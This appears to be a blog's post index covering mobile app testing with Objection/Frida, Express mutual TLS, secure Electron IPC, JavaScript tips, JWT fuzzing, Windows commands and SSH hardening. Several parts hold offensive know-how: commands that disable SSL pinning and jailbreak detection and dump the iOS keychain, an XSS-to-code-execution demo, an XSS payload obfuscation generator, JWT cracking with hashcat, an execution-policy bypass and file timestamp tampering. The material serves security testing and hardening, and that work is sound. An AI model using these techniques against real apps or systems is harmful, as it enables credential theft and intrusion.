Detection iOS Application Info iOS DataStorage SetupInstall ObjectionThe objection python package will need to be installed as well as frida-tools:pip3 install frida-tools objectionTest ObjectionEnsure the package is working by running the objection command:root@kali:~# objectionUsage: objection [OPTIONS] COMMAND [ARGS]... _ _ _ _ ___| |_|_|___ ___| |_|_|___ ___ | . | . | | -_| _| _| | . | | |___|___| |___|___|_| |_|___|_|_| |___|(object)inject(ion) Runtime Mobile Exploration by: @leonjza from @sensepost By default, communications will happen over USB, unless the --network option is provided.Find ApplicationUse Frida to check for installed applications on the phone:Show running applications:frida-ps -Ua -U for USB mode -a for applications onlyShow all installed applications:frida-ps -Uai -i for install applicationsYou should see something like this:root@kali:~# frida-ps -Ua PID Name Identifier ---- ---------- -------------------------2594 DuckDuckGo com.duckduckgo.mobile.iosAttach to ApplicationOnce we know the name of our target application, we can attach to it with the following command:objection -g NAME explore Where NAME is DuckDuckGo or com.duckduckgo.mobile.ios in the above example.A command can be executed as soon as Objection attaches to an application using:objection -g com.duckduckgo.mobile.ios explore --startup-command \"COMMAND\" COMMAND might be something like ios sslpinning disable on an iPhone.A single command can be executed instead of exploring the application:objection -g com.duckduckgo.mobile.ios run \"COMMAND\" COMMAND might be something like ios cookies get on an iPhone.Android &amp; iOSFiles Description Command Get Environment Info env View files in current Dir ls Print current Dir pwd Print file contents file cat FILENAME Download file (from Phone) file download PHONE_FILE [PC_FILE] Upload file (to Phone) file upload PC_FILE [PHONE_FILE] HTTP Server Description Command Start HTTP Server (in current dir) file http start Stop HTTP Server file http stop Status of HTTP Server file http status Hookingios examples used below. Commands should work for both ios and android. Description Command List Application Classes ios hooking list classes Search for Class ios hooking search classes SEARCH_STRING List Class Methods ios hooking list class_methods CLASS_NAME Search for Methods ios hooking search methods SEARCH_STRING Hook ALL Class Methods (View params) ios hooking watch class CLASS_NAME Hook Single Class Methods ios hooking watch method \"-[CLASS_NAME METHOD_NAME]\" –dump-args –dump-return –dump-backtrace Change Boolean Method Return Value ios hooking set return_value \"-[CLASS_NAME METHOD_NAME]\" false Generate Frida hooking template ios hooking generate simple CLASS_NAME Other Description Command View Jobs jobs list Stop/Kill Jobs jobs kill JOB_ID AndroidSSLPinning &amp; Root Detection Description Command Disable SSLPinning android sslpinning disable Disable SSLPinning (quiet mode) android sslpinning disable –quiet Disable Jailbreak Detection android root disable Android Hooking Description Command List Activities android hooking list activities List Receivers android hooking list receivers List Services android hooking list services Get Current Activity android hooking get current_activity iOSSSLPinning &amp; Jailbreak Detection Description Command Disable SSLPinning ios sslpinning disable Disable SSLPinning (quiet mode) ios sslpinning disable –quiet Disable Jailbreak Detection ios jailbreak disable iOS Application Info Description Command Get Binary Info ios info binary Get PList Files ios plist cat Info.plist Get Application Bundles ios bundles list_bundles Get External Frameworks ios bundles list_frameworks iOS DataStorage Description Command Get Keychain ios keychain dump Get Keychain (Auto-Decode) ios keychain dump –smart Get Keychain (Save-As JSON) ios keychain dump –json keychain.json View Cookies ios cookies get View NSUserDefaults ios nsuserdefaults get View NSURLCredentialStorage ios nsurlcredentialstorage dump Pasteboard Monitor ios pasteboard monitor " }, { "title": "NodeJS Express Cert Based Mutual Auth", "url": "/posts/express-cert-based-mutual-auth/", "categories": "javascript, nodejs", "tags": "javascript, express, certificate, web, security, https, http, nodejs, server", "date": "2021-09-07 07:25:38 +1000", "snippet": "In this post we’ll look at how to add Certificate Based Mutual Authentication to an express HTTPS server. This will allow us to require a User Certificate before being able to communicate with out ...", "content": "In this post we’ll look at how to add Certificate Based Mutual Authentication to an express HTTPS server. This will allow us to require a User Certificate before being able to communicate with out express server.This post will assume that you already know how to setup a HTTPS server using express. If you don’t know how to, you can learn here. Require Certificate Custom Authorisation Logic Why Custom Logic? Full CodeRequire CertificateTo enable Cert Based Mutual Auth, some additional parameters (ca, requestCert &amp; rejectUnauthorized) need to be provided in the Server Options:const serverOptions = {\t// Certificate Settings\tca: fs.readFileSync(path.join(__dirname, 'certs/custom_root_ca.crt')),\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// Cert-Based Mutual Auth settings\trequestCert: true,\trejectUnauthorized: true,} ca specifies the Certificate Authority (CA) that was used to sign the User Certificates that will be provided. requestCert forces the client to send a User Certificate upon connection. rejectUnauthorized sets whether the client connection should be terminated if the Users Cert verification fails.Custom Authorisation LogicCustom logic can be added to the server instead of immediately rejecting the connection. We can do it by setting rejectUnauthorized to false and adding the following code:const path = require('path');const fs = require('fs');const express = require('express');const app = express();const serverOptions = {\t// Certificate Settings\tca: fs.readFileSync(path.join(__dirname, 'certs/custom_root_ca.crt')),\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// Cert-Based Mutual Auth settings\trequestCert: true,\trejectUnauthorized: false,}const server = require('https').Server(serverOptions, app);app.use((req, res, next) =&gt; {\ttry {\t\t// Get the Certificate the User provided\t\tlet cert = req.socket.getPeerCertificate();\t\t// The Certificate is VALID\t\tif (req.client.authorized) {\t\t\tconsole.log(`Certificate \"${cert.subject.CN}\" is VALID and was issued by \"${cert.issuer.CN}\"`);\t\t\tnext();\t\t}\t\t// The Certificate is NOT VALID\t\telse if (cert.subject) {\t\t\tconsole.log(`Certificates from \"${cert.issuer.CN}\" are NOT VALID. User \"${cert.subject.CN}\"`);\t\t\tres.sendStatus(403);\t\t}\t\t// A Certificate was NOT PROVIDED\t\telse {\t\t\tconsole.log(`No Certificate provided by the client`);\t\t\tres.status(403).send(`Certificate Required`);\t\t}\t} catch (err) {\t\tconsole.log(err);\t\tres.sendStatus(404);\t}});Why Custom Logic?Why would you do the above logic? Great question!In general, you shouldn’t. If your application requires a certificate to be accessed period, you SHOULDN’T use custom logic. You should set rejectUnauthorized to true and let express do the heavy lifting.However, there are cases when you might need to handle the logic yourself, such as only requiring a certificate to access certain parts of an application (like /admin).app.use((req, res, next) =&gt; {\ttry {\t\t// Get the Certificate the User provided\t\tlet cert = req.socket.getPeerCertificate();\t\t// If the user isn't accessing Admin area, DON'T require a Certificate\t\tif (!req.path.startsWith('/admin')) {\t\t\tnext();\t\t}\t\t// The Certificate is VALID\t\telse if (req.client.authorized) {\t\t\tconsole.log(`Certificate \"${cert.subject.CN}\" is VALID and was issued by \"${cert.issuer.CN}\"`);\t\t\tnext();\t\t}\t\t// The Certificate is NOT VALID\t\telse if (cert.subject) {\t\t\tconsole.log(`Certificates from \"${cert.issuer.CN}\" are NOT VALID. User \"${cert.subject.CN}\"`);\t\t\tres.sendStatus(403);\t\t}\t\t// A Certificate was NOT PROVIDED\t\telse {\t\t\tconsole.log(`No Certificate provided by the client`);\t\t\tres.status(403).send(`Certificate Required`);\t\t}\t} catch (err) {\t\tres.sendStatus(404);\t}});Another example might be having custom logic for logging and/or debugging purposes.Full Codenpm i expressconst express = require('express');const path = require('path');const fs = require('fs');const app = express();const PORT = 8443;const serverOptions = {\t// Certificate Settings\tca: fs.readFileSync(path.join(__dirname, 'certs/custom_root_ca.crt')),\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key')),\t// Cert-Based Mutual Auth settings\trequestCert: true,\trejectUnauthorized: false,}const server = require('https').Server(serverOptions, app);app.use((req, res, next) =&gt; {\ttry {\t\t// Get the Certificate the User provided\t\tlet cert = req.socket.getPeerCertificate();\t\t// The Certificate is VALID\t\tif (req.client.authorized) {\t\t\tconsole.log(`Certificate \"${cert.subject.CN}\" is VALID and was issued by \"${cert.issuer.CN}\"`);\t\t\tnext();\t\t}\t\t// The Certificate is NOT VALID\t\telse if (cert.subject) {\t\t\tconsole.log(`Certificates from \"${cert.issuer.CN}\" are NOT VALID. User \"${cert.subject.CN}\"`);\t\t\tres.sendStatus(403);\t\t}\t\t// A Certificate was NOT PROVIDED\t\telse {\t\t\tconsole.log(`No Certificate provided by the client`);\t\t\tres.status(403).send(`Certificate Required`);\t\t}\t} catch (err) {\t\tres.sendStatus(404);\t}});app.get('/', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});// Catch any unforeseen errorsapp.use((err, __, res, ___) =&gt; res.send({ success: false }));// Start the Serverserver.listen(PORT, () =&gt; { console.log(`[-] Server Listening on Port ${PORT}`);});" }, { "title": "Secure Electron IPC", "url": "/posts/secure-electron-ipc/", "categories": "javascript, nodejs", "tags": "electron, security, javascript, nodejs, ipc, react", "date": "2021-08-27 17:26:57 +1000", "snippet": "In this post we’ll look at how to do secure IPC (Inter-Process-Communication) in Electron.PLEASE NOTE this is NOT a tutorial on Electron or Electron IPC, it will assume you already know how to use ...", "content": "In this post we’ll look at how to do secure IPC (Inter-Process-Communication) in Electron.PLEASE NOTE this is NOT a tutorial on Electron or Electron IPC, it will assume you already know how to use Electron and how IPC works. Why does it matter? The RCE Problem Server Side electron.js preload.js Client SideWhy does it matter?To keep it short, insecure IPC can lead to full blown RCE (Remote Code Execute).How? If you misconfigure the following two settings: contextIsolation set to false nodeIntegration set to trueWith the above settings, it’s possible to do the following on the front-end in JavaScript:const { ipcRenderer } = window.require('electron');ipcRenderer.send('send-ipc-msg-server', 'Hello'); And this should work perfectly fine.The RCE ProblemWhile the above solution might work for IPC, we’ve just opened the back-end up to the front-end.If someone were to get XSS on the front-end, they could run a command like this:window.require('child_process').execSync('calc');For a little bit more fun:window.require('fs').readdirSync('C:\\\\');So yeah, this is not a good solution. Fortunately, there is a better way to do IPC.Server Sideelectron.jsOur first step will be to ensure BrowserWindow doesn’t have any insecure option enabled. contextIsolation should be true. enableRemoteModule should be false.The second step will to specify the location of our preload.js file. If you don’t already have a preload.js file, create one and specify the path:const electron = require('electron');const BrowserWindow = electron.BrowserWindow;const path = require('path');const win = new BrowserWindow({\twidth: 1800,\theight: 1000,\twebPreferences: {\t\tcontextIsolation: true,\t\tenableRemoteModule: false,\t\tpreload: path.join(__dirname, \"preload.js\")\t}});Finally we will also need to setup an IPC listener on the back-side. This can be done in electron.js or another back-side file:const { ipcMain } = require('electron');// Event handler for incoming IPC messagesipcMain.on('send-ipc-msg-server', (event, arg) =&gt; {\tconsole.log('From CLIENT:');\tconsole.log(arg);\t// Send a message back to the client\tevent.sender.send('send-ipc-msg-client', `Return Message: ${(new Date()).toLocaleString()}`)});preload.jsIn the preload.js file, the following code will be required:const {\tcontextBridge, ipcRenderer } = require(\"electron\");contextBridge.exposeInMainWorld(\t\"ipcComm\", {\t\tsend: (channel, data) =&gt; {\t\t\tipcRenderer.send(channel, data);\t\t},\t\ton: (channel, callback) =&gt; {\t\t\t// Remove `event` parameter (the underscore parameter) as the UI doesn't need it\t\t\tipcRenderer.on(channel, (_, ...args) =&gt; {\t\t\t\tcallback(...args);\t\t\t});\t\t},\t\tremoveAllListeners: (channel) =&gt; {\t\t\tipcRenderer.removeAllListeners(channel);\t\t}\t});What does this do? This creates a safe “bridge” for our front-end to talk to the back-end. Any communication with the back-end must go through this bridge.contextBridge.exposeInMainWorld(apiName, obj) takes 2 parameters: apiName is the key that will be added to the front-end window Object. You can access it using window[apiName]. obj is the Object or Value that will be returned when you access window[apiName].The name ipcComm is arbitrary and you can call it what you like.The keys inside the provided Object have been setup as follows: send a function to send messages to the back-end on a certain channel. on a function to setup a listener on a channel for when the server sends messages back. removeAllListeners a function to remove all the listeners on a channel.Why should you do it like this?The reason for using this system is so that the front-end can’t import back-end modules directly, nor can it use the contextBridge or ipcRenderer modules directly.Client SideNow that we have our bridge setup, let’s see how to use it. In a Component let’s add the following code:useEffect(() =&gt; {\twindow.ipcComm.on('send-ipc-msg-client', (returnValue) =&gt; {\t\tconsole.log(\"From SERVER:\");\t\tconsole.log(returnValue);\t});\twindow.ipcComm.send('send-ipc-msg-server', 'Hello');\treturn () =&gt; {\t\twindow.ipcComm.removeAllListeners('send-ipc-msg-client');\t}// eslint-disable-next-line}, [0]);Break down of the code above: Line 2-5 setup a listener on the send-ipc-msg-client channel with a callback for when a message is received. Line 7 send the message Hello to the server on the send-ipc-msg-server channel. Line 9-11 return a function that will remove all listeners on the send-ipc-msg-client channel when the Component is unmounted. Line 12-13 Provide a static value to useEffect so that the code is only run once when the Component is mounted and NOT after every update.If you are using a class based Component, then you can setup the listener and send the message in componentDidMount, and remove the listener in componentWillUnmount:componentDidMount() {\twindow.ipcComm.on('send-ipc-msg-client', (returnValue) =&gt; {\t\tconsole.log(\"From SERVER:\");\t\tconsole.log(returnValue);\t});\twindow.ipcComm.send('send-ipc-msg-server', 'Hello');}componentWillUnmount() {\twindow.ipcComm.removeAllListeners('send-ipc-msg-client');}References and More Info ElectronJS - contextBridge Electron RCE via XSS" }, { "title": "JavaScript Tips & Tricks 2", "url": "/posts/javascript-tips-and-tricks-2/", "categories": "javascript, programming", "tags": "javascript, nodejs, xss", "date": "2021-08-26 18:32:02 +1000", "snippet": "In this post we’ll look at some more useful tips and tricks when using JavaScript. Copying to Clipboard in the Browser Object Functions Numeric Separators Displaying Units Formatting N...", "content": "In this post we’ll look at some more useful tips and tricks when using JavaScript. Copying to Clipboard in the Browser Object Functions Numeric Separators Displaying Units Formatting Numbers Formatting Currencies Formatting Units Quoteless XSS Payloads Compact Version Expanded Version Object Freezing Freezing Deep Freezing Binding Setting parameters before calling the function Controlling what this refers to Both Copying to Clipboard in the Browsernavigator.clipboard.writeText('Value To Copy to Clipboard'); An error can occur Uncaught (in promise) DOMException: Clipboard write was blocked due to lack of user activation. if the user is not focused on the browser tab when this command is run.Object Functionslet testObject = {name: \"Alex\", city: \"Melbourne\", age: 200}; console.log(Object.keys(testObject)); // [\"name\", \"city\", \"age\"]console.log(Object.values(testObject)); // [\"Alex\", \"Melbourne\", 200]console.log(Object.entries(testObject)); // [[\"name\", \"Alex\"], [\"city\", \"Melbourne\"], [\"age\", 2000]] Object.key(inputObject) returns a Array of the keys in the Object. Object.values(inputObject) returns a Array of the values in the Object. Object.entries(inputObject) returns a Array of Arrays, where each inner Array contains two elements (the key and the value).Numeric Separatorslet numberBad = 10000000000; // HARD to readlet numberGood = 10_000_000_000; // EASY to readlet floatValue = 25_832_834.451;let hexValue = 0xff_ff_ff; // 16777215 in Base10let binaryValue = 0b1000_0001; // 129 in Base10 This is great for static values in your code as it can greatly improve readability.Displaying UnitsA situation that most front-end developers will face is formatting numbers. Say we have a variable containing the value 124685.019 and want it formatted nicely with a separator as 124,685.019, or maybe as Australian dollars, or as Spanish Euros. Normally this would mean looking for an NPM module that does this. Fortunately, JavaScript has built in methods to do such operations:Formatting Numberslet number = 124685.019;let prettyNumberAustralia = new Intl.NumberFormat('en-AU').format(number);let prettyNumberIndia = new Intl.NumberFormat('en-IN').format(number);console.log(prettyNumberAustralia); // 124,685.019console.log(prettyNumberIndia); // 1,24,685.019Formatting Currencieslet amount = 124685.019;let prettyAmountAustralianDollars = new Intl.NumberFormat('en-AU', { style: 'currency', currency: 'AUD' }).format(amount);let prettyAmountSpanishEuros = new Intl.NumberFormat('es-ES', { style: 'currency', currency: 'EUR' }).format(amount);console.log(prettyAmountAustralianDollars); // $124,685.02console.log(prettyAmountSpanishEuros); // 124.685,02 €Formatting Unitslet value = 109.3;let prettyUnitCelsius = new Intl.NumberFormat('en-US', { style: 'unit', unit: 'celsius' }).format(value);let prettyUnitMPH = new Intl.NumberFormat('en-US', { style: 'unit', unit: 'mile-per-hour' }).format(value);let prettyUnitKMHShort = new Intl.NumberFormat('en-AU', { style: 'unit', unit: 'kilometer-per-hour' }).format(value);let prettyUnitKMHLong = new Intl.NumberFormat('en-AU', { style: 'unit', unit: 'kilometer-per-hour', unitDisplay: 'long' }).format(value);console.log(prettyUnitCelsius); // 109.3°Cconsole.log(prettyUnitMPH); // 109.3 mphconsole.log(prettyUnitKMHShort); // 109.3 km/hconsole.log(prettyUnitKMHLong); // 109.3 kilometres per hour More units available ECMA Docs - Simple Unit Identifier.Quoteless XSS PayloadsCompact Version:let payload = 'alert(1)';let evalStatement;// Method 1evalStatement = \"eval(String.fromCharCode(\"+payload.charCodeAt(0);for (let i=1;i&lt;payload.length;i++) evalStatement += \",\"+payload.charCodeAt(i);evalStatement+=\"))\";// Method 2evalStatement = \"eval(String.fromCharCode(\"+payload.split('').map(x =&gt; x.charCodeAt()).join(',')+\"))\";// evalStatement = \"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\"Expanded Version:let payload = 'alert(1)';// Method 1let evalStatement = 'eval(String.fromCharCode('; evalStatement += payload.charCodeAt(0); for (let i = 1; i &lt; payload.length; i++) {\tevalStatement += ',' + payload.charCodeAt(i);} evalStatement += '))';// Method 2evalStatement = 'eval(String.fromCharCode(';evalStatement += payload.split('').map(char =&gt; char.charCodeAt()).join(',');evalStatement += '))';Object FreezingFreezingIf you create a const variable and store an Object in it, the keys and values are still modifiable:const dataObject = {\tusername: 'alex',\tpassword: 'SomethingSecure'};dataObject.password = '';console.log(dataObject); // {username: \"alex\", password: \"\"}Using freeze will prevent this from happening. However, freeze won’t stop child-objects being updated:const dataObject = {\tusername: 'alex',\tpassword: 'SomethingSecure',\taddress: {\t\tcountry: 'Australia',\t\tcity: 'Melbourne'\t}};Object.freeze(dataObject);// This WON'T workdataObject.password = '';dataObject.anotherKey = 'test';// This WILL workdataObject.address.city = 'Sydney';// {username: \"alex\", password: \"SomethingSecure\", address: {country: \"Australia\", city: \"Sydney\"}}console.log(dataObject);Deep FreezingTo fully freeze an Object we need to “Deep Freeze” it:function DeepFreeze(inputObj) {\tObject.values(inputObj).forEach(currentObjValue =&gt; {\t\tif (typeof(currentObjValue) === 'object') DeepFreeze(currentObjValue);\t});\tObject.freeze(inputObj);}const dataObject = {\tusername: 'alex',\tpassword: 'SomethingSecure',\taddress: {\t\tcountry: 'Australia',\t\tcity: 'Melbourne'\t}};DeepFreeze(dataObject);// This WON'T workdataObject.password = '';dataObject.anotherKey = 'test';dataObject.address.city = 'Sydney';// {username: \"alex\", password: \"SomethingSecure\", address: {country: \"Australia\", city: \"Melbourne\"}}console.log(dataObject);BindingBinding allows us to set some parameters of a function before calling it, and it allows us to control what the keyword this refers to inside the function we are calling.Calling the bind function on a function, returns another function.targetFunction.bind(param1, param2, param3, ...); param1 is what we want the this to refer to. This could be a Object or Class (which is just an Object). If this is not required, the parameter should just be null. param2, param3 and on-wards are the parameters we want to pass to the function targetFunction.Setting parameters before calling the functionfunction sumValues(a, b) { return a + b;}// The first parameter of `plusFive` is now bound as 5.// The function `plusFive` will only require 1 parameter.let plusFive = sumValues.bind(null, 5);console.log(sumValues(10, 10)); // 20console.log(plusFive(15)); // 20// Check how many parameters the function takesconsole.log(sumValues.length); // 2console.log(plusFive.length); // 1Controlling what this refers tofunction sumValues() {\treturn this.a + this.b;}let dataObject = {a: 100, b: 20};let sumWithDataObject = sumValues.bind(dataObject);console.log(sumWithDataObject()); // 120Bothfunction sumValues(c, d, e) {\treturn this.a + this.b + c + d + e;}let dataObject = {a: 100, b: 20};let sumValuesWithDataObject = sumValues.bind(dataObject, 1, 5);console.log(sumValuesWithDataObject(10)); // 136More InfoMore information regarding the above tips can be found here: MDN Web Docs - Object Static Methods MDN Web Docs - Intl.NumberFormat MDN Web Docs - Object.freeze() MDN Web Docs - Function.prototype.bind()" }, { "title": "API Fuzzing", "url": "/posts/api-fuzzing/", "categories": "tools", "tags": "tools, security, web, http, https, json, fuzzing, api, testing", "date": "2021-06-10 18:43:07 +1000", "snippet": "PAGE UNDER CONSTRUCTIONFuzzing PayloadsCR-LFCopy “CR-LF” Payloads to ClipboardBad StringsCopy “Bad Strings” Payloads to ClipboardJSON Parameter Fuzzing - SmallCopy “JSON Parameter Fuzzing” - Small ...", "content": "PAGE UNDER CONSTRUCTIONFuzzing PayloadsCR-LFCopy “CR-LF” Payloads to ClipboardBad StringsCopy “Bad Strings” Payloads to ClipboardJSON Parameter Fuzzing - SmallCopy “JSON Parameter Fuzzing” - Small Payloads to ClipboardJSON Parameter Fuzzing - LargeCopy “JSON Parameter Fuzzing” - Large Payloads to Clipboard" }, { "title": "Random Windows Commands", "url": "/posts/random-windows-commands/", "categories": "security, windows", "tags": "security, windows, users, powershell, cmd, bitlocker", "date": "2021-06-08 22:19:18 +1000", "snippet": "Collection of interesting and useful commands in Windows command prompt and PowerShell. Command Prompt Change Computer Name View BitLocker Status Executing an Application in the...", "content": "Collection of interesting and useful commands in Windows command prompt and PowerShell. Command Prompt Change Computer Name View BitLocker Status Executing an Application in the Context of a Domain User Force Apply Group Policy Updates Set Windows KMS Lock Computer PowerShell Get PowerShell Version Execution Policy Bypass See Current SMB Connections See Shared Folders Change Creation Time Change Last Modified Time Command PromptChange Computer NameIn CMD as Admin:wmic computersystem where caption='CURRENT_PC_NAME' rename 'NEW_PC_NAME'View BitLocker StatusBitLocker status of all connected drives will be shown (inc USBs).In CMD as Admin:manage-bde -statusExecuting an Application in the Context of a Domain Userrunas /netonly /user:DOMAIN\\USERNAME \"PROGRAM_TO_EXECUTE\"Force Apply Group Policy Updatesgpupdate /forceSet Windows KMS Set KMS server: cscript C:\\Windows\\System32\\slmgr.vbs /skms KMS_SERVER Where KMS_SERVER is the IP/Hostname of the KMS server. Force activate Windows: cscript C:\\Windows\\System32\\slmgr.vbs -ato Lock ComputerRundll32.exe user32.dll,LockWorkStationPowerShellGet PowerShell Version$PSVersionTable$PSVersionTable.PSVersionExecution Policy Bypasspowershell -executionpolicy bypassSee Current SMB ConnectionsIn PowerShell as Admin:Get-SMBConnectionSee Shared FoldersIn PowerShell:Get-SmbShareChange Creation TimeChange the “Created At” time of a file:(Get-ChildItem -Path FILE_PATH).CreationTime='12.31.2010 10:30:59AM'Change Last Modified TimeChange the “Modified At” time of a file:(Get-ChildItem -Path FILE_PATH).LastWriteTime='12.31.2010 17:12:06'" }, { "title": "Filter and Map", "url": "/posts/filter-and-map/", "categories": "javascript, programming", "tags": "javascript, programming, algorithm", "date": "2021-05-29 14:23:46 +1000", "snippet": "In this post we’ll look at how to use the filter and map functions in JavaScript and why you would use them. Filter The Normal Way Using Filter Advanced Filtering Int...", "content": "In this post we’ll look at how to use the filter and map functions in JavaScript and why you would use them. Filter The Normal Way Using Filter Advanced Filtering Intro Use Case Map Normal Way Using Map A Better Use Case Using Filter &amp; Map More InfoFor the below examples, we’ll consider the situation were we have the following data about some people:let data = [{ name: 'Alex', age: 18, city: 'Melbourne' },{ name: 'Chloe', age: 26, city: 'Perth' }, { name: 'Frank', age: 56, city: 'Brisbane' }, { name: 'Christine', age: 7, city: 'Darwin' }, { name: 'Craig', age: 17, city: 'Melbourne' }];This data represents the sort thing you would expect to deal with when handling API responses that use JSON, i.e. Arrays of Objects.FilterThe filter function is called on an Array, takes a Function as input, and produces another Array as output. The input Function is called for every element in the input Array, and returns either true or false on whether it should be included in the output Array.The Normal WayUsing the people data, we want an Array of all the people who are 18 or older. If you didn’t know about filter, you might do something like this:let filteredData = [];for (let i = 0; i &lt; data.length; ++i) { if (data[i].age &gt;= 18) { filteredData.push(data[i]); }}Using FilterWe can implement the same functionality with filter like this:let filteredData = data.filter(function(person) { return person.age &gt;= 18});This can be made even more concise using an Arrow Function:let filteredData = data.filter(person =&gt; person.age &gt;= 18);Advanced FilteringIntroYou aren’t limited to just filtering Arrays of Object. Any Array can be be filtered. Here is a sneaky trick you can do.Recall that in JavaScript we can force values to be a boolean using the !! operator. This is performing the not operation twice, which cancels itself out. However, in the process, the first not operation converts it to a boolean, and the second not operation undoes the first, leaving us with the boolean value of the input.!!true // true!!null // false!!NaN // false!!undefined // false!!'' // false!![] // true!!{} // true!!0 // false!!1 // true (any non-zero number will be true)Why do I bring this up? Because we can use this trick remove these “false” values from Arrays with filter.let data = [null, 0, 1, true, false, undefined];let filteredData = data.filter(x =&gt; !!x);// filteredData = [1, true]Even better though, we don’t actually need the the !!. The filter function doesn’t require us to return true or false explicitly. The value we return will be forced to a boolean using something like !!.let data = [null, 0, 1, true, false, undefined];let filteredData = data.filter(x =&gt; x);Use CaseWhere else might this be useful? Removing empty strings from Arrays maybe:let stringData = `string1string2string3`;let data = stringData.split('\\n');// data = [\"\", \"string1\", \"string2\", \"string3\", \"\"]We can remove those annoying empty strings with filter:let stringData = `string1string2string3`;let data = stringData.split('\\n');let filteredData = data.filter(x =&gt; x);// filteredData = [\"string1\", \"string2\", \"string3\"]We can even do it on the same line:let data = stringData.split('\\n').filter(x =&gt; x);MapThe map function is called on an Array, takes a Function as input, and produces another Array as output. The input Function is called for every element in the input Array, and returns any value desired as the output. The output Array will be the same length as the input Array.Normal WayIf we have an Array of numbers and wanted to calculate the square of each number, we could do something like this:let inputNumbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];let squaredNumbers = [];for (let i = 0; i &lt; inputNumbers.length; ++i) { squaredNumbers.push(Math.pow(inputNumbers[i], 2));}Using MapWe can implement the same functionality with map like this:let squaredNumbers = inputNumbers.map(function(number) { return Math.pow(number, 2);});This can be made even more concise using an Arrow Function:let squaredNumbers = inputNumbers.map(number =&gt; Math.pow(number, 2));A Better Use CaseA much better use case is when working with Arrays of Object. Using the data at the start of this page, let’s see how we could get an Array of all the people’s names:let names = data.map(person =&gt; person.name); Yes, it’s that easy!Using Filter &amp; MapWe can combine filter and map to produce some short but powerful operations.Using the people data again, let’s produce an Array of the names of people who are under 18:let filteredData = data.filter(person =&gt; person.age &lt; 18).map(person =&gt; person.name); If speed is of concern, try and put the filter operation first to reduce the size of the Array passed to map.More InfoMore information regarding filter and map can be found here: MDN Web Docs - Array.prototype.filter() MDN Web Docs - Array.prototype.map()" }, { "title": "JWT Fuzzing", "url": "/posts/jwt-fuzzing/", "categories": "tools", "tags": "tools, security, web, http, https, jwt, cryptography", "date": "2021-05-25 18:03:38 +1000", "snippet": "The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt...", "content": "The goal of this tool is to create a list of fuzzing payloads for testing JWTs on web services and applications. The payloads are designed to test common JWT issues and bypasses, as well as attempt to cause server errors via invalid and missing values. This includes an option to dynamically inject every field and subfield in the JWT header and body with SQL injection payloads as well as bad and invalid types. The payloads generated are ready to put straight into a fuzzing tool, like Intruder in Burp Suite.CVE-2022-21449 Update: Payload generation has been updated to include payloads for CVE-2022-21449 “Psychic Signatures in Java”. More information regarding a PoC can be found on this GitHub repo.Crack HS256 JWT with Hashcathashcat.exe -m 16500 -a 0 -w 3 JWT_LIST WORD_LIST JWT_LSIT path to file containing JWTs to crack. WORD_LIST path to file containing (pass)word list (e.g. rockyou). NOTE that this only works for the HS256 signing algorithm.WARNINGBe VERY careful when pasting JWT tokens into arbitrary websites! JWT’s can grant access to systems and must be treated as confidential.ALL processing on this website is done client-side. However, this may not be case with other sites.The value in the input field below is stored in session storage for temporary persistance (refreshes and changing pages). This is cleared when your browser/tab is closed. If you don’t want tokens stored at all, update the option below:Temp StoreDo not Temp StoreInsert JWTGenerate Example JWTClear JWTDo not Generate All PayloadsGenerate ALL Payloads (Dynamically Inject ALL JWT fields)JWT DataYou can edit the below dataRestore DataHeaderPayload\tSession length is .\t\tJWT is SignatureSuggested ModificationsCopy Payloads to ClipboardShow Decoded JWTs" }, { "title": "SSH Server Hardening", "url": "/posts/ssh-server-hardening/", "categories": "security, ssh", "tags": "security, ssh, cryptography", "date": "2021-05-24 23:17:04 +1000", "snippet": "Guide for hardening SSH server on a Linux machine. Enable Certificate Based Authentication Disable Password Authentication Disable Empty Passwords Disable Root Login Change Default SSH Port O...", "content": "Guide for hardening SSH server on a Linux machine. Enable Certificate Based Authentication Disable Password Authentication Disable Empty Passwords Disable Root Login Change Default SSH Port Only Allow Selected Users and/or Groups Disable X11 Forwarding Disable GatewayPorts Disable PermitUserEnvironment Disable Weak Cryptographic Algorithms Regenerate RSA &amp; ED25519 Host Keys Disable DSA HostKeys Disable Small Diffie-Hellman Key Sizes Disable SSHv1 SSH Hardening ResourcesEnable Certificate Based AuthenticationPubkeyAuthentication yesDisable Password AuthenticationPasswordAuthentication noDisable Empty PasswordsPermitEmptyPasswords noDisable Root LoginPermitRootLogin noChange Default SSH PortPort 23456Only Allow Selected Users and/or GroupsAllowUsers user1 user2AllowGroups group1 group2 You can also deny access to certain users and groups with DenyUsers and DenyGroups respectively.Disable X11 ForwardingX11Forwarding noDisable GatewayPortsGatewayPorts noDisable PermitUserEnvironmentPermitUserEnvironment noDisable Weak Cryptographic AlgorithmsHardened configurationCiphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctrKexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256Extra-Hardened configurationCiphers aes256-gcm@openssh.com,aes256-ctrKexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-512Supported algorithms can be tested using nmap:nmap -sV --script ssh2-enum-algos -p PORT TARGET PORT is 22 by default. The -p flag can be excluded if you are using port 22.Regenerate RSA &amp; ED25519 Host Keysrm /etc/ssh/ssh_host_*ssh-keygen -t rsa -b 4096 -f /etc/ssh/ssh_host_rsa_key -N \"\"ssh-keygen -t ed25519 -f /etc/ssh/ssh_host_ed25519_key -N \"\"Disable DSA HostKeys#HostKey /etc/ssh/ssh_host_dsa_keyDisable Small Diffie-Hellman Key Sizesawk '$5 &gt;= 3071' /etc/ssh/moduli &gt; /etc/ssh/moduli.safemv /etc/ssh/moduli.safe /etc/ssh/moduliDisable SSHv1Protocol 2 This is not applicable to newer versions of OpenSSH, only older versions.SSH Hardening ResourcesMore information about the rational and general 